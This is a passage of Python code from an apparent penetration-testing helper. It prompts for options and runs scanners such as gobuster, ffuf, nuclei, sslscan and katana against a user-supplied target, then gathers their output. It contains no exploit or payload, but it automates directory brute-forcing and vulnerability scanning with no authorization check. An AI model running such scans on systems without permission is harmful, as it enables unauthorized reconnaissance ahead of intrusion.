            raise ValueError("a valid wordlist path is required")
        o["wordlist"] = wordlist
        if spec.name in {"gobuster", "ffuf", "feroxbuster"}:
            o["threads"] = ask_int("[?] Threads [10]: ", 10, 1, 500)
        if spec.name == "gobuster":
            o["extensions"] = input("[?] Extensions [php,html,txt]: ").strip() or "php,html,txt"

    elif spec.name in {"openssl", "sslscan", "testssl.sh"}:
        o["port"] = ask_int("[?] TLS port [443]: ", 443, 1, 65535)

    elif spec.name == "dig":
        record = input("[?] Record [A]: ").strip().upper() or "A"
        allowed = {"A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME", "PTR", "SRV"}
        if record not in allowed:
            raise ValueError("unsupported DNS record type")
        o["record"] = record

    elif spec.name == "nuclei":
        severity = input("[?] Severity [low,medium,high,critical]: ").strip() or "low,medium,high,critical"
        allowed = {"info", "low", "medium", "high", "critical"}
        levels = [x.strip().lower() for x in severity.split(",") if x.strip()]
        if not levels or any(x not in allowed for x in levels):
            raise ValueError("invalid nuclei severity list")
        o["severity"] = ",".join(dict.fromkeys(levels))
        o["rate"] = ask_int("[?] Rate limit [10]: ", 10, 1, 100000)

    elif spec.name in {"hakrawler", "katana"}:
        o["depth"] = ask_int("[?] Crawl depth [2]: ", 2, 1, 20)

    return o


def run_tool(spec: ToolSpec, target: str, options: Optional[dict] = None, timeout: int = 300):
    if not spec.command or not shutil.which(spec.command):
        return {"tool": spec.name, "status": "unavailable", "stdout": "", "stderr": "tool not installed", "returncode": -1, "command": ""}
    options = options or {}
    cmd = spec.builder(target, options)
    if any(x == "" for x in cmd):
        return {"tool": spec.name, "status": "error", "stdout": "", "stderr": "missing required option", "returncode": -1, "command": shlex.join(cmd)}
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors="replace")
        status = "ok" if p.returncode == 0 else "failed"
        return {"tool": spec.name, "status": status, "stdout": p.stdout, "stderr": p.stderr, "returncode": p.returncode, "command": shlex.join(cmd)}
    except subprocess.TimeoutExpired as e:
        out = e.stdout or ""
        err = e.stderr or ""
        if isinstance(out, bytes):
            out = out.decode(errors="replace")
        if isinstance(err, bytes):
            err = err.decode(errors="replace")
        return {"tool": spec.name, "status": "timeout", "stdout": out, "stderr": err or "TIMEOUT", "returncode": -1, "command": shlex.join(cmd)}
    except Exception as e:
        return {"tool": spec.name, "status": "error", "stdout": "", "stderr": str(e), "returncode": -1, "command": shlex.join(cmd)}


def interactive_run(target: str) -> list[dict]:
    print_tool_catalog()
    status = availability()
    print("[1] Run one tool")
    print("[2] Run several tools")
    print("[3] Run all installed tools")
    print("[0] Back")
    choice = input("[?] Select: ").strip()
    if choice == "0": return []
    if choice == "3":
        selected = [t for t in TOOL_LIST if status[t.name]]
    else:
        raw = input("[?] Tool number(s), comma-separated: ").strip()
        selected = []
        for item in raw.split(","):
            if item.strip().isdigit():
                idx = int(item.strip()) - 1
                if 0 <= idx < len(TOOL_LIST): selected.append(TOOL_LIST[idx])
    results = []
    for spec in selected:
        if not status[spec.name]:
            print(f"{C.R}[MISS]{C.X} {spec.name} is not installed")
            results.append(run_tool(spec, target, {}))
            continue
        print()
        print(f"Running {spec.name} — {spec.description}")
        try:
            options = _ask_common(spec)
        except (ValueError, KeyboardInterrupt) as e:
            print(f"{C.Y}[SKIP]{C.X} {spec.name}: {e}")
            results.append({"tool": spec.name, "status": "skipped", "stdout": "", "stderr": str(e), "returncode": -1, "command": ""})
            continue
        result = run_tool(spec, target, options)
        print(f"{C.G if result['status']=='ok' else C.R}[{result['status'].upper()}]{C.X} {spec.name}")
        if result["stdout"]:
            print(result["stdout"][:4000].rstrip())
        if result["stderr"] and result["status"] not in {"ok"}:
            print(result["stderr"][:1000].rstrip())
        results.append(result)
    return results
